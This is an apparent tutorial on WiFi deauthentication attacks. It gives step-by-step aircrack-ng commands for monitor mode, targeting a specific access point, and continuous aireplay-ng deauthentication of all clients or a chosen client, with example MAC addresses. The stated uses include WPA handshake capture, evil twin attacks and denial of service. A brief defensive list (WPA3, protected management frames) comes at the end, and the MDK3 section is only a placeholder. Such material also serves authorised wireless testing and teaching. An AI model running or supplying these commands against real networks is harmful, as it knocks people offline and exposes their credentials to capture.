# 📡 Deauthentication Attacks

# 📘 Overview

A **Deauthentication Attack** is a wireless attack used to forcibly disconnect clients from a WiFi network by sending forged deauthentication frames.

---

# ⚠ Why It Works

This attack exploits the fact that:

```text id="gq4ghq"
802.11 management frames are not always protected
```

Because of this:

* Attackers can spoof devices
* Force users offline
* Trigger reconnection attempts
* Capture WPA/WPA2 handshakes

---

# 🔄 How Deauthentication Works

## Step 1

Attacker sends fake deauthentication frames to the Access Point pretending to be the client.

---

## Step 2

Attacker also sends fake deauthentication frames to the client pretending to be the AP.

---

## Step 3

Client disconnects from WiFi.

---

## Step 4

Client attempts reconnection.

---

## Step 5

During reconnection:

```text id="8jwhnp"
WPA/WPA2 handshake can be captured
```

---

# 🎯 Use Cases

* Capture WPA/WPA2 handshakes
* Disconnect specific users
* Wireless resilience testing
* Evil Twin attacks
* Denial of Service (DoS)

---

# ⚙ Requirements

# 📡 Wireless Adapter Must Support

* Monitor mode
* Packet injection

---

# 🛠 Required Tools

* Aircrack-ng Suite
* MDK3 / MDK4 (optional)

---

# 🎯 Target Requirement

* Active clients connected to target network

---

# 🔍 Step 1 — Enable Monitor Mode

```bash id="x0vjlwm"
airmon-ng start wlan0
```

Creates:

```text id="qpc2sv"
wlan0mon
```

---

# 🔎 Step 2 — Discover Nearby Networks

```bash id="axphbn"
airodump-ng wlan0mon
```

Collect:

* BSSID
* Channel
* Connected clients

---

# 🎯 Step 3 — Lock to Specific Target

```bash id="5b5w7l"
airodump-ng --channel <CH> --bssid <BSSID> wlan0mon
```

Example:

```bash id="fxxoae"
airodump-ng --channel 1 --bssid 50:D4:F7:C7:C1:4D wlan0mon
```

✅ Important:

This dump session now works only for the selected:

* Channel
* Access Point (BSSID)

This improves:

* Handshake capture
* Client monitoring
* Attack reliability

---

# ⚠ Important Workflow Note

Before launching deauthentication attacks:

## Correct Workflow

### 1️⃣ Enable monitor mode

```bash id="r4r0ao"
airmon-ng start wlan0
```

---

### 2️⃣ Run airodump-ng

```bash id="z4a7fj"
airodump-ng wlan0mon
```

---

### 3️⃣ Lock onto specific target

```bash id="3rhh3r"
airodump-ng --channel <CH> --bssid <BSSID> wlan0mon
```

---

### 4️⃣ Keep this dump window running

It continuously monitors:

* Clients
* Handshakes
* Traffic
* Reconnection attempts

---

### 5️⃣ Open NEW terminal window

Then launch:

* aireplay-ng
* mdk3
* mdk4

for the attack.

---

# 🚨 Deauthenticate All Clients

## Limited Count

```bash id="k8zcw5"
aireplay-ng --deauth 100 -a <BSSID> wlan0mon
```

---

## Continuous Attack

```bash id="5m3b7w"
aireplay-ng --deauth 0 -a <BSSID> wlan0mon
```

Equivalent short form:

```bash id="8t5xrl"
aireplay-ng -0 0 -a <BSSID> wlan0mon
```

---

# 🧪 Example

```bash id="0aqhbg"
aireplay-ng --deauth 0 -a 50:D4:F7:C7:C1:4D wlan0mon
```

---

# 🎯 Deauthenticate Specific Client

```bash id="lg6d1s"
aireplay-ng --deauth 0 -a <BSSID> -c <CLIENT_MAC> wlan0mon
```

Short form:

```bash id="t0o7d9"
aireplay-ng -0 0 -a <BSSID> -c <CLIENT_MAC> wlan0mon
```

---

# 🧪 Example

```bash id="0ew91f"
aireplay-ng -0 0 -a 50:D4:F7:C7:C1:4D -c 5E:99:CF:4B:85:5C wlan0mon
```

---

# 💣 Using MDK3 / MDK4

# ⚠ Important Workflow Before Using MDK3

Before launching MDK3 attack:

---

## 1️⃣ Enable Monitor Mode

```bash id="7pn0zn"
airmon-ng start wlan0
```

---

## 2️⃣ Run Airodump-ng

```bash id="hyq0hx"
airodump-ng wlan0mon
```

---

## 3️⃣ Lock Onto Specific Target

```bash id="8lc8wt"
airodump-ng --channel <CH> --bssid <BSSID> wlan0mon
```

---

## 4️⃣ KEEP THIS WINDOW RUNNING

This continuously monitors:

* Target AP
* Connected clients
* Handshakes

---

## 5️⃣ Open NEW Terminal Window

Then run:

```text id="m8z9mn"
MDK3 / MDK4 attack commands
```

---

# 📘 Why This Is Important

Because:

* MDK attacks work better on fixed channels
* Target monitoring continues simultaneously
* Handshakes can be captured during attack
* Easier to monitor disconnected clients

---

# 🛡 Defensive Measures

* Enable WPA3 if possible
* Enable 802.11w Protected Management Frames (PMF)
* Use strong passwords
* Monitor rogue deauthentication traffic
* Keep firmware updated

---

# 📌 Summary Table

| Tool        | Purpose                   |
| ----------- | ------------------------- |
| airmon-ng   | Enable monitor mode       |
| airodump-ng | Monitor & capture traffic |
| aireplay-ng | Perform deauth attacks    |
| MDK3 / MDK4 | Advanced wireless attacks |
